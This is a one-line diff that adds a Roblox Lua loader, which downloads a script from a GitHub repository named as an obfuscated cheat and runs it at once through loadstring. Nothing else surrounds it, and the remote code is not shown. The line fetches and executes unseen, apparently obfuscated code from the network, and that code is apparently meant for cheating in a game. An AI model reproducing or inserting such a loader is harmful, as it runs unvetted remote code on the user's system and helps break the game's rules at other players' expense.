@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Themostbored/Border-cheat-obfuscated/main/Hell.lua"))()
